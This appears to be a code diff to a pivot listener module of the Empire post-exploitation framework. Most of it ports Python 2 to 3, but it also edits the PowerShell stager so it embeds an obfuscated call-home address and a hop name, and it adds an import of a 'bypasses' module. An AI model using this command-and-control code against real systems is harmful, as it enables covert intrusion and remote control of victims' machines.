@@ -1,6 +1,10 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 import base64
 import random
 import copy
+import os
 import hashlib
 
 # Empire imports
@@ -9,9 +13,10 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -71,7 +76,7 @@ class Listener:
         If there's a default response expected from the server that the client needs to ignore,
         (i.e. a default HTTP page), put the generation here.
         """
-        print helpers.color("[!] default_response() not implemented for pivot listeners")
+        print(helpers.color("[!] default_response() not implemented for pivot listeners"))
         return ''
 
 
@@ -82,7 +87,7 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
 
         return True
@@ -94,7 +99,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/template generate_launcher(): no language specified!'))
             return None
 
         if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
@@ -192,8 +197,9 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-                
+                #stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                stager += "$ser='%s';$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
+
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -246,7 +252,7 @@ class Listener:
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print helpers.color(p, color='red')
+                    print(helpers.color(p, color='red'))
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -326,10 +332,10 @@ class Listener:
                     return launcherBase
 
             else:
-                print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")
+                print(helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."))
 
         else:
-            print helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!"))
 
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
@@ -338,7 +344,7 @@ class Listener:
         implemented to return the stage1 key-negotiation stager code.
         """
         if not language:
-            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
+            print(helpers.color('[!] listeners/http generate_stager(): no language specified!'))
             return None
 
 
@@ -444,7 +450,7 @@ class Listener:
                 return stager
 
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
@@ -453,7 +459,7 @@ class Listener:
         implemented to return the actual staged agent code.
         """
         if not language:
-            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
+            print(helpers.color('[!] listeners/http generate_agent(): no language specified!'))
             return None
 
         language = language.lower()
@@ -519,7 +525,7 @@ class Listener:
 
             return code
         else:
-            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -683,9 +689,9 @@ def send_message(packets=None):
                 return updateServers + sendMessage
 
             else:
-                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+                print(helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
         else:
-            print helpers.color('[!] listeners/http generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/http generate_comms(): no language specified!'))
 
 
     def start(self, name=''):
@@ -702,7 +708,7 @@ def send_message(packets=None):
             # check if a listener for the agent already exists
 
             if self.mainMenu.listeners.is_listener_valid(tempOptions['Name']['Value']):
-                print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Name']['Value']))
+                print(helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Name']['Value'])))
                 return False
 
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
@@ -789,7 +795,7 @@ def send_message(packets=None):
                     # clone the existing listener options
                     self.options = copy.deepcopy(listenerOptions)
 
-                    for option, values in self.options.iteritems():
+                    for option, values in self.options.items():
 
                         if option.lower() == 'name':
                             self.options[option]['Value'] = sessionID
@@ -804,7 +810,7 @@ def send_message(packets=None):
 
 
                     # check to see if there was a host value at all
-                    if "Host" not in self.options.keys():
+                    if "Host" not in list(self.options.keys()):
                         self.options['Host']['Value'] = host
 
                     self.mainMenu.agents.add_agent_task_db(tempOptions['Name']['Value'], "TASK_SHELL", script)
@@ -820,17 +826,17 @@ def send_message(packets=None):
                     script = """
                     """
 
-                    print helpers.color("[!] Python pivot listener not implemented")
+                    print(helpers.color("[!] Python pivot listener not implemented"))
                     return False
 
                 else:
-                    print helpers.color("[!] Unable to determine the language for the agent")
+                    print(helpers.color("[!] Unable to determine the language for the agent"))
 
             else:
                 if not isElevated:
-                    print helpers.color("[!] Agent must be elevated to run a redirector")
+                    print(helpers.color("[!] Agent must be elevated to run a redirector"))
                 else:
-                    print helpers.color("[!] Agent is not present in the cache")
+                    print(helpers.color("[!] Agent is not present in the cache"))
                 return False
 
 
@@ -840,7 +846,7 @@ def send_message(packets=None):
         named listener here.
         """
         if name and name != '':
-            print helpers.color("[!] Killing listener '%s'" % (name))
+            print(helpers.color("[!] Killing listener '%s'" % (name)))
 
             sessionID = self.mainMenu.agents.get_agent_id_db(name)
             isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
@@ -928,9 +934,9 @@ def send_message(packets=None):
 
                 elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):
 
-                    print helpers.color("[!] Shutdown not implemented for python")
+                    print(helpers.color("[!] Shutdown not implemented for python"))
 
             else:
-                print helpers.color("[!] Agent is not present in the cache or not elevated")
+                print(helpers.color("[!] Agent is not present in the cache or not elevated"))
 
         pass
